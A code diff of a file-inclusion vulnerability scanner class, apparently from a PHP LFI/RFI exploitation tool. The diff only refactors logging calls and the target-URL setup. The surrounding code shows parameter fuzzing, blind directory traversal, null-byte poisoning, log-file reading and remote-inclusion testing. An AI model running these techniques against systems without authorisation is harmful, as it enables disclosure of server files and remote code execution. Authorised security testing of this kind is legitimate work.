@@ -42,16 +42,16 @@ class targetScanner (baseClass.baseClass):
     def _load(self):
         self.INC_SUCCESS_MSG = "for inclusion (include_path="
         self.MonkeyTechnique = False
-        self._log("TargetScanner loaded.", self.globSet.LOG_DEBUG)
+        self._log("TargetScanner loaded.", self.LOG_DEBUG)
         self.params = {}
 
-    def prepareTarget(self):
-        self.Target_URL = self.globalSettings().getTargetURL()
+    def prepareTarget(self, url):
+        self.Target_URL = url
 
-        self._log("Parsing URL '%s'..."%(self.Target_URL), self.globSet.LOG_ALWAYS)
+        self._log("Parsing URL '%s'..."%(self.Target_URL), self.LOG_ALWAYS)
 
         if (self.Target_URL.find("?") == -1):
-            self._log("Target URL doesn't have any params.", self.globSet.LOG_DEBUG);
+            self._log("Target URL doesn't have any params.", self.LOG_DEBUG);
             return(False);
 
         data = self.Target_URL.split("?")[1]
@@ -66,19 +66,19 @@ class targetScanner (baseClass.baseClass):
     def testTargetVuln(self):
         ret = []
 
-        self._log("Fiddling around with URL...", self.globSet.LOG_INFO)
+        self._log("Fiddling around with URL...", self.LOG_INFO)
 
         for k,v in self.params.items():
             tmpurl = self.Target_URL
             rndStr = self.getRandomStr()
             tmpurl = tmpurl.replace("%s=%s"%(k,v), "%s=%s"%(k, rndStr))
-            self._log("Requesting: '%s'..." %(tmpurl), self.globSet.LOG_DEBUG)
+            self._log("Requesting: '%s'..." %(tmpurl), self.LOG_DEBUG)
             code = self.doGetRequest(tmpurl)
             if (code != None):
                 RE_SUCCESS_MSG = re.compile(INCLUDE_ERR_MSG%(rndStr), re.DOTALL)
                 m = RE_SUCCESS_MSG.search(code)
                 if (m != None):
-                    self._log("Possible file inclusion found! -> '%s' with Parameter '%s'." %(tmpurl, k), self.globSet.LOG_ALWAYS)
+                    self._log("Possible file inclusion found! -> '%s' with Parameter '%s'." %(tmpurl, k), self.LOG_ALWAYS)
                     self._writeToLog("POSSIBLE ; %s ; %s"%(self.Target_URL, k))
                     rep = self.identifyVuln(self.Target_URL, self.params, k)
                     if (rep != None):
@@ -88,12 +88,12 @@ class targetScanner (baseClass.baseClass):
                 RE_SUCCESS_MSG = re.compile("<b>Warning</b>:  file\(.*?%s.*?\)*"%(rndStr), re.DOTALL)
                 m = RE_SUCCESS_MSG.search(code)
                 if (m != None):
-                    self._log("Possible local file disclose found! -> '%s' with Parameter '%s'. (IDENTIFY DISABLED IN THIS VERSION)"%(tmpurl, k), self.globSet.LOG_ALWAYS)
+                    self._log("Possible local file disclose found! -> '%s' with Parameter '%s'. (IDENTIFY DISABLED IN THIS VERSION)"%(tmpurl, k), self.LOG_ALWAYS)
                     #self.identifyReadFile(URL, Params, VulnParam)
                     self._writeToLog("READ ; %s ; %s"%(tmpurl, k))
 
         if (len(ret) == 0 and self.MonkeyTechnique):
-            self._log("No bug found by relying on error messages. Trying to break it blindly...", self.globSet.LOG_DEBUG)
+            self._log("No bug found by relying on error messages. Trying to break it blindly...", self.LOG_DEBUG)
             files     = settings["files"]
             for f,v,p,t in files:
                 for i in range(settings["blind"]["minlevel"], settings["blind"]["maxlevel"]):
@@ -105,21 +105,21 @@ class targetScanner (baseClass.baseClass):
                     for k,V in self.params.items():
                         tmpurl = self.Target_URL
                         tmpurl = tmpurl.replace("%s=%s"%(k,V), "%s=%s"%(k, testfile))
-                        self._log("Requesting: '%s'..." %(tmpurl), self.globSet.LOG_DEBUG)
+                        self._log("Requesting: '%s'..." %(tmpurl), self.LOG_DEBUG)
                         code = self.doGetRequest(tmpurl)
                         if (code != None):
                             if (code.find(v) != -1):
-                                self._log("Possible file inclusion found blindly! -> '%s' with Parameter '%s'." %(tmpurl, k), self.globSet.LOG_ALWAYS)
+                                self._log("Possible file inclusion found blindly! -> '%s' with Parameter '%s'." %(tmpurl, k), self.LOG_ALWAYS)
                                 doBreak = True
                                 rep = self.identifyVuln(self.Target_URL, self.params, k, blindmode=("/.." * i, False))
                             else:
                                 tmpurl = self.Target_URL
                                 tmpfile = testfile + "%00"
                                 tmpurl = tmpurl.replace("%s=%s"%(k,V), "%s=%s"%(k, tmpfile))
-                                self._log("Requesting: '%s'..." %(tmpurl), self.globSet.LOG_DEBUG)
+                                self._log("Requesting: '%s'..." %(tmpurl), self.LOG_DEBUG)
                                 code = self.doGetRequest(tmpurl)
                                 if (code.find(v) != -1):
-                                    self._log("Possible file inclusion found blindly! -> '%s' with Parameter '%s'." %(tmpurl, k), self.globSet.LOG_ALWAYS)
+                                    self._log("Possible file inclusion found blindly! -> '%s' with Parameter '%s'." %(tmpurl, k), self.LOG_ALWAYS)
                                     doBreak = True
                                     rep = self.identifyVuln(self.Target_URL, self.params, k, blindmode=("/.." * i, True))
                             if (rep != None):
@@ -128,7 +128,7 @@ class targetScanner (baseClass.baseClass):
                                 rep = None
                         else:
                             # Previous result was none. Assuming that we can break here.
-                            self._log("Code == None. Skipping testing of the URL.", self.globSet.LOG_DEBUG)
+                            self._log("Code == None. Skipping testing of the URL.", self.LOG_DEBUG)
                             doBreak = True
 
                     if (doBreak): break
@@ -145,7 +145,7 @@ class targetScanner (baseClass.baseClass):
             scriptpath = None
             pre = None
 
-            self._log("Identifying Vulnerability '%s' with Parameter '%s'..."%(URL, VulnParam), self.globSet.LOG_ALWAYS)
+            self._log("Identifying Vulnerability '%s' with Parameter '%s'..."%(URL, VulnParam), self.LOG_ALWAYS)
             tmpurl = URL
             rndStr = self.getRandomStr()
             tmpurl = tmpurl.replace("%s=%s"%(VulnParam,Params[VulnParam]), "%s=%s"%(VulnParam, rndStr))
@@ -155,10 +155,10 @@ class targetScanner (baseClass.baseClass):
             code = self.doGetRequest(tmpurl)
 
             if (code == None):
-                self._log("Identification of vulnerability failed. (code == None)", self.globSet.LOG_ERROR)
+                self._log("Identification of vulnerability failed. (code == None)", self.LOG_ERROR)
             m = RE_SUCCESS_MSG.search(code)
             if (m == None):
-                self._log("Identification of vulnerability failed. (m == None)", self.globSet.LOG_ERROR)
+                self._log("Identification of vulnerability failed. (m == None)", self.LOG_ERROR)
                 return None
 
 
@@ -169,7 +169,7 @@ class targetScanner (baseClass.baseClass):
                 s = RE_SCRIPT_PATH.search(code)
                 if (s != None): break
             if (s == None):
-                self._log("Failed to retrieve script path.", self.globSet.LOG_WARN)
+                self._log("Failed to retrieve script path.", self.LOG_WARN)
 
                 print "[MINOR BUG FOUND]"
                 print "------------------------------------------------------"
@@ -200,13 +200,13 @@ class targetScanner (baseClass.baseClass):
 
                 # Check if scriptpath was received correctly.
                 if(scriptpath!=""):
-                    self._log("Scriptpath received: '%s'" %(scriptpath), self.globSet.LOG_INFO)
+                    self._log("Scriptpath received: '%s'" %(scriptpath), self.LOG_INFO)
                     r.setServerPath(scriptpath)
                     r.setServerScript(script)
 
 
             if (r.isWindows()):
-                self._log("Windows servers are currently not supported. Skipping it...", self.globSet.LOG_WARN)
+                self._log("Windows servers are currently not supported. Skipping it...", self.LOG_WARN)
                 return(None)
 
 
@@ -237,18 +237,18 @@ class targetScanner (baseClass.baseClass):
                 r.setSurfix(sur)
 
                 if (sur != ""):
-                    self._log("Trying NULL-Byte Poisoning to get rid of the suffix...", self.globSet.LOG_INFO)
+                    self._log("Trying NULL-Byte Poisoning to get rid of the suffix...", self.LOG_INFO)
                     tmpurl = URL
                     tmpurl = tmpurl.replace("%s=%s"%(VulnParam,Params[VulnParam]), "%s=%s%%00"%(VulnParam, rndStr))
                     code = self.doGetRequest(tmpurl)
                     if (code == None):
-                        self._log("NULL-Byte testing failed.", self.globSet.LOG_WARN)
+                        self._log("NULL-Byte testing failed.", self.LOG_WARN)
                         r.setNullBytePossible(False)
                     elif (code.find("%s\\0%s"%(rndStr, sur)) != -1 or code.find("%s%s"%(rndStr, sur)) != -1):
-                        self._log("NULL-Byte Poisoning not possible.", self.globSet.LOG_INFO)
+                        self._log("NULL-Byte Poisoning not possible.", self.LOG_INFO)
                         r.setNullBytePossible(False)
                     else:
-                        self._log("NULL-Byte Poisoning successfull!", self.globSet.LOG_INFO)
+                        self._log("NULL-Byte Poisoning successfull!", self.LOG_INFO)
                         r.setSurfix("%00")
                         r.setNullBytePossible(True)
 
@@ -256,10 +256,10 @@ class targetScanner (baseClass.baseClass):
             if (scriptpath == ""):
                 # Failed to get scriptpath with easy method :(
                 if (pre != ""):
-                    self._log("Failed to retrieve path but we are forced to go relative!", self.globSet.LOG_WARN)
+                    self._log("Failed to retrieve path but we are forced to go relative!", self.LOG_WARN)
                     return(None)
                 else:
-                    self._log("Failed to retrieve path! It's an absolute injection so I'll fake it to '/'...", self.globSet.LOG_WARN)
+                    self._log("Failed to retrieve path! It's an absolute injection so I'll fake it to '/'...", self.LOG_WARN)
                     scriptpath = "/"
                     r.setServerPath(scriptpath)
                     r.setServerScript(script)
@@ -271,7 +271,7 @@ class targetScanner (baseClass.baseClass):
             # Blindmode
             prefix = blindmode[0]
             isNull = blindmode[1]
-            self._log("Identifying Vulnerability '%s' with Parameter '%s' blindly..."%(URL, VulnParam), self.globSet.LOG_ALWAYS)
+            self._log("Identifying Vulnerability '%s' with Parameter '%s' blindly..."%(URL, VulnParam), self.LOG_ALWAYS)
             r = report(URL, Params, VulnParam)
             r.setBlindDiscovered(True)
             r.setSurfix("")
@@ -294,7 +294,7 @@ class targetScanner (baseClass.baseClass):
         rfi_mode = settings["dynamic_rfi"]["mode"]
 
         ret = []
-        self._log("Testing default files...", self.globSet.LOG_DEBUG)
+        self._log("Testing default files...", self.LOG_DEBUG)
 
         
 
@@ -312,9 +312,9 @@ class targetScanner (baseClass.baseClass):
                 else:
                     pass
             else:
-                self._log("Skipping file '%s'."%f, self.globSet.LOG_INFO)
+                self._log("Skipping file '%s'."%f, self.LOG_INFO)
 
-        self._log("Testing absolute files...", self.globSet.LOG_DEBUG)
+        self._log("Testing absolute files...", self.LOG_DEBUG)
         for f,p,post,type in abs_files:
             quiz = answer = None
             if (post != None):
@@ -328,9 +328,9 @@ class targetScanner (baseClass.baseClass):
                 else:
                     pass
             else:
-                self._log("Skipping absolute file '%s'."%f, self.globSet.LOG_INFO)
+                self._log("Skipping absolute file '%s'."%f, self.LOG_INFO)
 
-        self._log("Testing log files...", self.globSet.LOG_DEBUG)
+        self._log("Testing log files...", self.LOG_DEBUG)
         for f,p,type in log_files:
             if ((rep.getSurfix() == "" or rep.isNullbytePossible() or f.endswith(rep.getSurfix()))):
                 if (self.readFile(rep, f, p)):
@@ -339,11 +339,11 @@ class targetScanner (baseClass.baseClass):
                 else:
                     pass
             else:
-                self._log("Skipping log file '%s'."%f, self.globSet.LOG_INFO)
+                self._log("Skipping log file '%s'."%f, self.LOG_INFO)
 
         if (rfi_mode in ("ftp", "local")):
-            if (rfi_mode == "ftp"): self._log("Testing remote inclusion dynamicly with FTP...", self.globSet.LOG_INFO)
-            if (rfi_mode == "local"): self._log("Testing remote inclusion dynamicly with local server...", self.globSet.LOG_INFO)
+            if (rfi_mode == "ftp"): self._log("Testing remote inclusion dynamicly with FTP...", self.LOG_INFO)
+            if (rfi_mode == "local"): self._log("Testing remote inclusion dynamicly with local server...", self.LOG_INFO)
             if (rep.getPrefix() == ""):
                 fl = up = None
                 if (rfi_mode == "ftp"):
@@ -370,7 +370,7 @@ class targetScanner (baseClass.baseClass):
                 if (rfi_mode == "local"): 
                     self.deleteLocalPayload(up["local"])
         else:
-            self._log("Testing remote inclusion...", self.globSet.LOG_DEBUG)
+            self._log("Testing remote inclusion...", self.LOG_DEBUG)
             for f,p,type in rmt_files:
                 if (rep.getPrefix() == "" and(rep.getSurfix() == "" or rep.isNullbytePossible() or f.endswith(rep.getSurfix()))):
                     if ((not rep.isNullbytePossible() and not rep.getSurfix() == "") and f.endswith(rep.getSurfix())):
@@ -384,7 +384,7 @@ class targetScanner (baseClass.baseClass):
                     else:
                         pass
                 else:
-                    self._log("Skipping remote file '%s'."%f, self.globSet.LOG_INFO)
+                    self._log("Skipping remote file '%s'."%f, self.LOG_INFO)
 
 
 
@@ -393,7 +393,7 @@ class targetScanner (baseClass.baseClass):
 
 
     def readFile(self, report, filepath, filepattern, isAbs=False, POST=None):
-        self._log("Testing file '%s'..." %filepath, self.globSet.LOG_INFO)
+        self._log("Testing file '%s'..." %filepath, self.LOG_INFO)
         tmpurl = report.getURL()
         prefix = report.getPrefix()
         surfix = report.getSurfix()
@@ -420,7 +420,7 @@ class targetScanner (baseClass.baseClass):
         payload = "%s%s"%(filepatha, surfix)
         tmpurl = tmpurl.replace("%s=%s" %(vuln, params[vuln]), "%s=%s"%(vuln, payload))
 
-        self._log("Testing URL: " + tmpurl, self.globSet.LOG_DEBUG)
+        self._log("Testing URL: " + tmpurl, self.LOG_DEBUG)
 
         RE_SUCCESS_MSG = re.compile(INCLUDE_ERR_MSG %(filepath), re.DOTALL)
         code = None
@@ -443,9 +443,9 @@ class targetScanner (baseClass.baseClass):
     def __addToken(self, token):
         if (token.find("=") == -1):
             self.params[token] = ""
-            self._log("Token found: [%s] = none" %(token), self.globSet.LOG_DEBUG)
+            self._log("Token found: [%s] = none" %(token), self.LOG_DEBUG)
         else:
             k = token.split("=")[0]
             v = token.split("=")[1]
             self.params[k] = v
-            self._log("Token found: [%s] = [%s]" %(k,v), self.globSet.LOG_DEBUG)
+            self._log("Token found: [%s] = [%s]" %(k,v), self.LOG_DEBUG)
